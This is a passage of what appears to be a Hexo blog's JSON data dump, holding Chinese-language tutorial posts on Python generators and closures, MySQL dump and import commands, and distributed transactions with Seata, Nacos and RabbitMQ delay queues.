Iterable,这个类可以判断某个对象可不可以迭代，最主要的是它可以产生迭代器,如果要用Iterable来创建一个迭代器，那么必须使用__iter__方法和__next__方法，且两个方法是共生的，有了iter就一定有next，通过next来迭代，通过iter让对象可以迭代，这个对象多指不规律的，定义成一个类的,next的返回值用户要用for循环来遍历，next就是一个迭代的规则</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>3、可以一个一个的取，取一个用一个:方法</li>\n</ul>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>__next__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 取第一个</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>__next__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 取第二个</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>__next__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 取第三</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"生成器\"><a href=\"#生成器\" class=\"headerlink\" title=\"生成器\"></a>生成器</h2><blockquote>\n<p>可以用一个拿一个，不用就不管，生成器会自动暂停</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>   1、生成器是一个特殊的迭代器，并且不需要导入任何的包，用了yield X的函数就是生成器，也就是说如果函数里面出现了yield，那么这个函数就不再是函数，而是一个生成器调用的时候，也是创建的生成器对象，</li>\n<li>   2、生成器不会存储数据，而只是用来产生数据的，多就用多久拿出来使用，大大节省了存储空间</li>\n<li>   3、生成器的启动方法:</li>\n</ul>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token number\">1</span>、re <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 这样就会返回生成器中yield后面的值，也就是说re = yield后面的变量</span>\n<span class=\"token number\">2</span>、re <span class=\"token operator\">=</span> send<span class=\"token punctuation\">(</span><span class=\"token string\">\"传递的参数\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 传递的参数\"就是给”yield x\"整体赋值</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<blockquote>\n<ul>\n<li>   4、可以用一个拿一个，不用就不管</li>\n</ul>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">re <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">)</span>\nre <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">)</span>\nre <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">)</span>\nre <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">)</span>\nre <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">\"hahah\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"闭包","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T05:56:46.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"python闭包概念","_content":"## 闭包\n> 在一个内部函数中，对外部作用域的变量进行引用，(并且一般外部函数的返回值为内部函数)，那么内部函数就被认为是闭包(python可以返回函数，特性之一)\n\n```python\ndef startAt(x):\n\tdef incrementBy(y):\n    \treturn x+y\n    return incrementBy\n    \n a = startAt(1)\n print(a)\n print(a(1))\n```\n## 闭包的格式\n```python\ndef func1(参数1, 参数2……):\n    def func2(参数1, 参数2……):\n        代码\n    return func2\n ```\n\n> 说明两点:\n>  - global:用于函数内,修改全局变量和其他局部变量的时候申明，但是如果不修改全局变量也可以不使用global关键字\n>  - nonlocal:用于内部函数要修改外部函数的变量的时候申明，声明的变量不是局部变量,也不是全局变量,而是外部嵌套函数内的变量\n\n## 匿名函数\n> - 定义:   变量名 = lambda 参数:返回值\n> - 调用:   变量名(参数)\n\n```python\nsum = lambda arg1, arg2: arg1 + arg2\n\nsum(1,2)\n```\n","source":"_posts/闭包.md","raw":"---\ntitle: 闭包\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 13:56:46\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: python闭包概念\ntags: basic\ncategories: Python\n---\n## 闭包\n> 在一个内部函数中，对外部作用域的变量进行引用，(并且一般外部函数的返回值为内部函数)，那么内部函数就被认为是闭包(python可以返回函数，特性之一)\n\n```python\ndef startAt(x):\n\tdef incrementBy(y):\n    \treturn x+y\n    return incrementBy\n    \n a = startAt(1)\n print(a)\n print(a(1))\n```\n## 闭包的格式\n```python\ndef func1(参数1, 参数2……):\n    def func2(参数1, 参数2……):\n        代码\n    return func2\n ```\n\n> 说明两点:\n>  - global:用于函数内,修改全局变量和其他局部变量的时候申明，但是如果不修改全局变量也可以不使用global关键字\n>  - nonlocal:用于内部函数要修改外部函数的变量的时候申明，声明的变量不是局部变量,也不是全局变量,而是外部嵌套函数内的变量\n\n## 匿名函数\n> - 定义:   变量名 = lambda 参数:返回值\n> - 调用:   变量名(参数)\n\n```python\nsum = lambda arg1, arg2: arg1 + arg2\n\nsum(1,2)\n```\n","slug":"闭包","published":1,"updated":"2023-03-10T02:51:42.763Z","_id":"cld2uqf6q000x1svk42f08a3r","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h2><blockquote>\n<p>在一个内部函数中，对外部作用域的变量进行引用，(并且一般外部函数的返回值为内部函数)，那么内部函数就被认为是闭包(python可以返回函数，特性之一)</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">startAt</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t<span class=\"token keyword\">def</span> <span class=\"token function\">incrementBy</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \t<span class=\"token keyword\">return</span> x<span class=\"token operator\">+</span>y\n    <span class=\"token keyword\">return</span> incrementBy\n    \n a <span class=\"token operator\">=</span> startAt<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"闭包的格式\"><a href=\"#闭包的格式\" class=\"headerlink\" title=\"闭包的格式\"></a>闭包的格式</h2><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">func1</span><span class=\"token punctuation\">(</span>参数<span class=\"token number\">1</span><span class=\"token punctuation\">,</span> 参数<span class=\"token number\">2</span>……<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">func2</span><span class=\"token punctuation\">(</span>参数<span class=\"token number\">1</span><span class=\"token punctuation\">,</span> 参数<span class=\"token number\">2</span>……<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        代码\n    <span class=\"token keyword\">return</span> func2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>说明两点:</p>\n<ul>\n<li>global:用于函数内,修改全局变量和其他局部变量的时候申明，但是如果不修改全局变量也可以不使用global关键字</li>\n<li>nonlocal:用于内部函数要修改外部函数的变量的时候申明，声明的变量不是局部变量,也不是全局变量,而是外部嵌套函数内的变量</li>\n</ul>\n</blockquote>\n<h2 id=\"匿名函数\"><a href=\"#匿名函数\" class=\"headerlink\" title=\"匿名函数\"></a>匿名函数</h2><blockquote>\n<ul>\n<li>定义:   变量名 = lambda 参数:返回值</li>\n<li>调用:   变量名(参数)</li>\n</ul>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">sum</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> arg1<span class=\"token punctuation\">,</span> arg2<span class=\"token punctuation\">:</span> arg1 <span class=\"token operator\">+</span> arg2\n\n<span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h2><blockquote>\n<p>在一个内部函数中，对外部作用域的变量进行引用，(并且一般外部函数的返回值为内部函数)，那么内部函数就被认为是闭包(python可以返回函数，特性之一)</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">startAt</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t<span class=\"token keyword\">def</span> <span class=\"token function\">incrementBy</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \t<span class=\"token keyword\">return</span> x<span class=\"token operator\">+</span>y\n    <span class=\"token keyword\">return</span> incrementBy\n    \n a <span class=\"token operator\">=</span> startAt<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"闭包的格式\"><a href=\"#闭包的格式\" class=\"headerlink\" title=\"闭包的格式\"></a>闭包的格式</h2><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">func1</span><span class=\"token punctuation\">(</span>参数<span class=\"token number\">1</span><span class=\"token punctuation\">,</span> 参数<span class=\"token number\">2</span>……<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">func2</span><span class=\"token punctuation\">(</span>参数<span class=\"token number\">1</span><span class=\"token punctuation\">,</span> 参数<span class=\"token number\">2</span>……<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        代码\n    <span class=\"token keyword\">return</span> func2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>说明两点:</p>\n<ul>\n<li>global:用于函数内,修改全局变量和其他局部变量的时候申明，但是如果不修改全局变量也可以不使用global关键字</li>\n<li>nonlocal:用于内部函数要修改外部函数的变量的时候申明，声明的变量不是局部变量,也不是全局变量,而是外部嵌套函数内的变量</li>\n</ul>\n</blockquote>\n<h2 id=\"匿名函数\"><a href=\"#匿名函数\" class=\"headerlink\" title=\"匿名函数\"></a>匿名函数</h2><blockquote>\n<ul>\n<li>定义:   变量名 = lambda 参数:返回值</li>\n<li>调用:   变量名(参数)</li>\n</ul>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">sum</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> arg1<span class=\"token punctuation\">,</span> arg2<span class=\"token punctuation\">:</span> arg1 <span class=\"token operator\">+</span> arg2\n\n<span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n"},{"title":"mysql导入导出","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-26T03:03:04.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"mysql数据导入导出","_content":"## 导出数据库\n```shell\nmysqldump -u userName -p password 数据库名字 > 位置+文件名字(sql文件)\n    \n1.导出整个数据库\nmysqldump -u 用户名 -p密码 数据库名 > 位置+导出的文件名(sql文件)\n\n\n2.导出一个表\nmysqldump -u 用户名 -p密码 数据库名 表名> 位置+导出的文件名(sql文件)\n```\n\n## 导入数据\n```shell\n# 先创建数据库\nset names utf8; # 设置编码\nsource 文件位置(sql文件)\n```","source":"_posts/mysql导入导出.md","raw":"---\ntitle: mysql导入导出\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-26 11:03:04\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: mysql数据导入导出\ntags: mysql\ncategories: db\n---\n## 导出数据库\n```shell\nmysqldump -u userName -p password 数据库名字 > 位置+文件名字(sql文件)\n    \n1.导出整个数据库\nmysqldump -u 用户名 -p密码 数据库名 > 位置+导出的文件名(sql文件)\n\n\n2.导出一个表\nmysqldump -u 用户名 -p密码 数据库名 表名> 位置+导出的文件名(sql文件)\n```\n\n## 导入数据\n```shell\n# 先创建数据库\nset names utf8; # 设置编码\nsource 文件位置(sql文件)\n```","slug":"mysql导入导出","published":1,"updated":"2023-03-10T02:55:09.907Z","_id":"cldcjex9g0000s8vk9mjt6dmi","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"导出数据库\"><a href=\"#导出数据库\" class=\"headerlink\" title=\"导出数据库\"></a>导出数据库</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">mysqldump <span class=\"token parameter variable\">-u</span> userName <span class=\"token parameter variable\">-p</span> password 数据库名字 <span class=\"token operator\">></span> 位置+文件名字<span class=\"token punctuation\">(</span>sql文件<span class=\"token punctuation\">)</span>\n    \n<span class=\"token number\">1</span>.导出整个数据库\nmysqldump <span class=\"token parameter variable\">-u</span> 用户名 -p密码 数据库名 <span class=\"token operator\">></span> 位置+导出的文件名<span class=\"token punctuation\">(</span>sql文件<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token number\">2</span>.导出一个表\nmysqldump <span class=\"token parameter variable\">-u</span> 用户名 -p密码 数据库名 表名<span class=\"token operator\">></span> 位置+导出的文件名<span class=\"token punctuation\">(</span>sql文件<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"导入数据\"><a href=\"#导入数据\" class=\"headerlink\" title=\"导入数据\"></a>导入数据</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 先创建数据库</span>\n<span class=\"token builtin class-name\">set</span> names utf8<span class=\"token punctuation\">;</span> <span class=\"token comment\"># 设置编码</span>\n<span class=\"token builtin class-name\">source</span> 文件位置<span class=\"token punctuation\">(</span>sql文件<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"导出数据库\"><a href=\"#导出数据库\" class=\"headerlink\" title=\"导出数据库\"></a>导出数据库</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">mysqldump <span class=\"token parameter variable\">-u</span> userName <span class=\"token parameter variable\">-p</span> password 数据库名字 <span class=\"token operator\">></span> 位置+文件名字<span class=\"token punctuation\">(</span>sql文件<span class=\"token punctuation\">)</span>\n    \n<span class=\"token number\">1</span>.导出整个数据库\nmysqldump <span class=\"token parameter variable\">-u</span> 用户名 -p密码 数据库名 <span class=\"token operator\">></span> 位置+导出的文件名<span class=\"token punctuation\">(</span>sql文件<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token number\">2</span>.导出一个表\nmysqldump <span class=\"token parameter variable\">-u</span> 用户名 -p密码 数据库名 表名<span class=\"token operator\">></span> 位置+导出的文件名<span class=\"token punctuation\">(</span>sql文件<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"导入数据\"><a href=\"#导入数据\" class=\"headerlink\" title=\"导入数据\"></a>导入数据</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 先创建数据库</span>\n<span class=\"token builtin class-name\">set</span> names utf8<span class=\"token punctuation\">;</span> <span class=\"token comment\"># 设置编码</span>\n<span class=\"token builtin class-name\">source</span> 文件位置<span class=\"token punctuation\">(</span>sql文件<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>"},{"title":"分布式事务","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-26T03:13:42.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"java分布式事务解决方案","_content":"\n## 分布式事务\n> CAP原则\n> \n> - 一致性、可用性、分区容错性，CAP原则是指，这三个要素最多只能实现两个，不可能三个同时实现，在分布式系统中永远都要满足分区容错，所以只能CA二选一\n> > - 一致性：成功就一起成功，失败也一起失败，保存一个值那么都保存一个值，在分布式系统中所有数据备份，在同一时刻必须有同样得值\n> > - 可用性：在集群中一部分节点故障后，集群整体还能响应客户端得读写请求\n> > - 分区容错性：大多数情况下，分布式系统都分布在多个子网络，每个子网络就叫做一个区，分区容错就是，区之间通信可能失败\n\n> raft算法(保证一致性)\n\n[动画解析](https://zinglix.xyz/2020/06/25/raft/)\n\n> BASE理论\n> \n> - 基本可用:损失时间(以前1秒得操作,现在5秒),损失功能(双11得时候,购物高峰期,可以引导用户去另一个页面)\n> - 软状态:指允许系统存在中间状态,而该中间状态不会影响系统整体可用性,分布式一般都会将数据存储多份,允许同步延迟就是软状态得体现\n> - 最终一致性:最终一致性指得是所有得数据经过一段时间后,最终达到一致得状态,弱一致和强一致相反,最终一致性是弱一致性得一种特殊情况\n\n> 分布式事务方案\n> \n> > - 2PC(强一致):二阶提交,分两个阶段提交,影响性能\n> > > - 总事务管理器询问微服务得本地管理器准备好提交数据了吗,响应准备好了,这一个阶段是询问状态\n> > > - 总事务管理器发送提交指令给微服务,如果有某一个微服务没有成功提交就回滚,这是第二阶段\n> \n> > - TCC(弱一致):柔性事务,TCC事务补偿型方案\n> > > - 让开发人员开发得时候开发三个代码提供给业务活动管理器回调,第一个Try尝试阶段,准备数据,第二个Confirm提交,第三个Cancel回滚\n> > > - 提供这三个代码让业务活动管理器调用\n> \n> > - 柔性事务-最大努力通知型\n> > > - 如果一个事务调用了多个微服务,那么有某一个微服务执行失败了,就将信息放到MQ中,让其他得微服务来订阅\n> > > - 如果之前得某个微服务断线了,那么可以设置这个MQ消息一直发送,直到真正收到为止\n>\n> > - 柔性事务-可靠消息+最终一致性方案(购物车结算得时候我们使用这个)\n> > > - 和`柔性事务-最大努力通知型`类似\n\n### seata(高并发不考虑)\n> 创建undo_log数据表,分布式事务得数据库都创建,用于分布式事务回滚日志 建表脚本在源码中的script目录去找\n ```sql\nCREATE TABLE `undo_log` (\n    `id` bigint(20) NOT NULL AUTO_INCREMENT,\n    `branch_id` bigint(20) NOT NULL,\n    `xid` varchar(100) NOT NULL,\n    `context` varchar(128) NOT NULL,\n    `rollback_info` longblob NOT NULL,\n    `log_status` int(11) NOT NULL,\n    `log_created` datetime NOT NULL,\n    `log_modified` datetime NOT NULL,\n    `ext` varchar(100) DEFAULT NULL,\n    PRIMARY KEY (`id`),\n    UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`) USING BTREE\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n>  [`下载Seata-Server事务协调器(TC)`](https://github.com/seata/seata/releases)\n> \n>  [`下在Seata-Server对应版本源码`](https://github.com/seata/seata)\n> \n>  修改Seata-Server得registry.conf中得配置文件位置和注册中心位置,如下配置\n\n```text\n# 配置注册中心得位置\nregistry {\n\n  type = \"nacos\"\n\n  nacos {\n    application = \"seata-server\"\n    serverAddr = \"127.0.0.1:8848\"\n    group = \"SEATA_GROUP\"\n    namespace = \"mall-dev\"\n    cluster = \"default\" # 集群名字\n    username = \"nacos\"\n    password = \"nacos\"\n  }\n}\n\n# 配置配置文件得位置\nconfig {\n\n  type = \"nacos\"\n\n  nacos {\n    serverAddr = \"127.0.0.1:8848\"\n    namespace = \"mall-dev\"\n    group = \"SEATA_GROUP\"\n    username = \"nacos\"\n    password = \"nacos\"\n  }\n}\n```\n\n>  修改file.conf,主要就是 TC事务日志存储在哪里 如下配置\n\n```text\n# TC日志存放位置\nstore {\n\n  mode = \"db\"\n\n  db {\n    datasource = \"druid\"\n    dbType = \"mysql\"\n    driverClassName = \"com.mysql.jdbc.Driver\"\n    url = \"jdbc:mysql://127.0.0.1:3306/seata_server?rewriteBatchedStatements=true\" # 创建出来\n    user = \"root\"\n    password = \"lqs\"\n    minConn = 5\n    maxConn = 100\n    globalTable = \"global_table\" # 创建出来\n    branchTable = \"branch_table\" # 创建出来\n    lockTable = \"lock_table\" # 创建出来\n    queryLimit = 100\n    maxWait = 5000\n  }\n}\n```\n\n> > - 创建global_table 建表脚本在源码中的script目录去找\n\n```sql\nCREATE TABLE IF NOT EXISTS `global_table`\n(\n    `xid`                       VARCHAR(128) NOT NULL,\n    `transaction_id`            BIGINT,\n    `status`                    TINYINT      NOT NULL,\n    `application_id`            VARCHAR(32),\n    `transaction_service_group` VARCHAR(32),\n    `transaction_name`          VARCHAR(128),\n    `timeout`                   INT,\n    `begin_time`                BIGINT,\n    `application_data`          VARCHAR(2000),\n    `gmt_create`                DATETIME,\n    `gmt_modified`              DATETIME,\n    PRIMARY KEY (`xid`),\n    KEY `idx_gmt_modified_status` (`gmt_modified`, `status`),\n    KEY `idx_transaction_id` (`transaction_id`)\n) ENGINE = InnoDB\n  DEFAULT CHARSET = utf8;\n```\n\n> > - 创建branch_table 建表脚本在源码中的script目录去找\n\n```sql\nCREATE TABLE IF NOT EXISTS `branch_table`\n(\n    `branch_id`         BIGINT       NOT NULL,\n    `xid`               VARCHAR(128) NOT NULL,\n    `transaction_id`    BIGINT,\n    `resource_group_id` VARCHAR(32),\n    `resource_id`       VARCHAR(256),\n    `branch_type`       VARCHAR(8),\n    `status`            TINYINT,\n    `client_id`         VARCHAR(64),\n    `application_data`  VARCHAR(2000),\n    `gmt_create`        DATETIME(6),\n    `gmt_modified`      DATETIME(6),\n    PRIMARY KEY (`branch_id`),\n    KEY `idx_xid` (`xid`)\n) ENGINE = InnoDB\n  DEFAULT CHARSET = utf8;\n```\n\n> > - 创建lock_table 建表脚本在源码中的script目录去找\n\n```sql\nCREATE TABLE IF NOT EXISTS `lock_table`\n(\n    `row_key`        VARCHAR(128) NOT NULL,\n    `xid`            VARCHAR(128),\n    `transaction_id` BIGINT,\n    `branch_id`      BIGINT       NOT NULL,\n    `resource_id`    VARCHAR(256),\n    `table_name`     VARCHAR(32),\n    `pk`             VARCHAR(36),\n    `gmt_create`     DATETIME,\n    `gmt_modified`   DATETIME,\n    PRIMARY KEY (`row_key`),\n    KEY `idx_branch_id` (`branch_id`)\n) ENGINE = InnoDB\n  DEFAULT CHARSET = utf8;\n```\n\n> 配置上线注册到nacos得配置 在源码中的script目录去找到 config-center下得config.txt修改如下配置\n\n```txt\nstore.mode=db\nstore.db.url=jdbc:mysql://127.0.0.1:3306/seata_server?useUnicode=true&rewriteBatchedStatements=true\nstore.db.user=root\nstore.db.password=lqs\n\nservice.vgroupMapping.chengdu=default # vgroupMappin后面得可以随便写但是要记住这个很重要,配置客户端得时候会用到,这个default可以修改但是必须和注册中心集群名字一样 这个配置也就是集群得时候用得\n```\n\n\n> nacos得到源码中的script目录中config-center下得config.txt中的配置\n\n```shell\n# 可以根据自己得需要修改这个文件\nbash config-center/nacos/nacos-config.sh\n```\n\n> 以上成功之后 启动seata\n\n```shell\nbash bin/seata-server.sh -p 端口 -n 节点数量\n```\n### 整合seata\n\n> 导入Seata依赖 spring-cloud-starter-alibaba-seata 默认还对导入seata-all seata-all得版本必须和下载得seata-server版本一样\n\n```xml\n<!--        seata事务协调器-->\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-starter-alibaba-seata</artifactId>\n</dependency>\n```\n\n> 配置application.properties\n\n```properties\n\nseata.tx-service-group=chengdu\nseata.enabled=true\nseata.application-id=${spring.application.name}\nseata.enable-auto-data-source-proxy=true\n\nseata.config.type=nacos\nseata.config.nacos.group=SEATA_GROUP\nseata.config.nacos.server-addr=localhost\nseata.config.nacos.namespace=mall-dev\nseata.config.nacos.password=nacos\nseata.config.nacos.username=nacos\n\n\nseata.registry.type=nacos\nseata.registry.nacos.group=SEATA_GROUP\nseata.registry.nacos.application=seata-server\nseata.registry.nacos.server-addr=localhost\nseata.registry.nacos.namespace=mall-dev\nseata.registry.nacos.password=nacos\nseata.registry.nacos.username=nacos\n\n```\n\n> 使用分布式事务 将@GlobalTransactional注解放在TM上\n\n> 如果TM出现异常,那么RM和TM都回滚,如果RM出现异常并且被处理(如try...catch),那么TC就感知不到,在TM中根据状态码来手动抛出异常回滚所有事务 或者GlobalTransactionContext.reload(RootContext.getXID()).rollback();手动回滚\n\n> 如果TM出现异常,那么RM和TM都回滚,如果RM中出现异常没有被处理,那么TC就可以感知到,并且直接回滚所有事务\n\n\n```java\n@GlobalTransactional\n@Transactional(readOnly = false)\n@Override\npublic SubmitOrderResponseVo submitOrder(OrderSubmitVo orderSubmitVo){\n\n    SubmitOrderResponseVo submitOrderResponse=new SubmitOrderResponseVo();\n\n    orderSubmitVoThreadLocal.set(orderSubmitVo);\n\n    AccountRespTo account=UserLoginInterceptor.user.get();\n\n    // 验证令牌\n    String orderToken=orderSubmitVo.getOrderToken();\n\n    ......\n}\n```\n\n### 柔性事务-可靠消息+最终一致性方案(RabbitMQ)\n> 我们使用这个方式来处理保存订单和锁定库存得分布式事务业务,使用延时队列来做,无论是下单失败还是锁定库存失败,通过延时队列,最终都会以补偿得方式回滚,交换机最好用Topic模式\n> ,如果要使用这个模式,最好还是数据表不要太单一,比如我们系统里有库存表,库存工作单表,库存工作单详情表,订单表这些表具有明确得指向性,比如,我们知道库存表一张表,如果锁定了库存,\n> 我们并不知道究竟是哪个用户锁定了库存,如果有工作单和详情单,我们就可以知道谁锁定了库存锁定了多少,再配合mq得消息,就可以准确得解锁.当然也可以不建立这些表,通过发送得mq信息来解锁.\n\n> 延时队列\n\n> > 延时队列:给队列设置一个ttl,到了指定得ttl里面得消息就会变成死信,这个被设置了ttl得就是延时队列,不能被消费者监听\n\n> > 死信:就是延时队列中过期得信息,死信在通过交换机发送给另外一个队列,只要有消费者来监听这个队列就可以获取这个死信来执行对应得业务\n\n> 我们系统得`保存订单和锁定库存得分布式事务业务`\n![](https://pub-pce.oss-cn-chengdu.aliyuncs.com/somgWebImageSingleGenerate/2023-01-26/ae981d0870da45cb8d2269487437db23.png)\n![](https://pub-pce.oss-cn-chengdu.aliyuncs.com/somgWebImageSingleGenerate/2023-01-26/920150f3ec1046cd93ee69c17d3908e6.png)\n\n> 延时队列示例\n\n>> 配置文件\n\n```properties\n# 开启发送端确认，消息抵达交换机的确认，属于生产者确认\nspring.rabbitmq.publisher-confirm-type=simple\n# 开启发送端消息抵达队列的确认，属于生产者确认\nspring.rabbitmq.publisher-returns=true\n# 只要抵达队列，以异步发送优先回调,属于生产者配置\nspring.rabbitmq.template.mandatory=true\n\n# 设置消费端手动签收\nspring.rabbitmq.listener.direct.acknowledge-mode=manual\n# 设置消费端手动签收\nspring.rabbitmq.listener.simple.acknowledge-mode=manual\n```\n\n>> 代码\n\n```java\n@Configuration\npublic class OrderAutoCancelPublisher<T> {\n\n\n    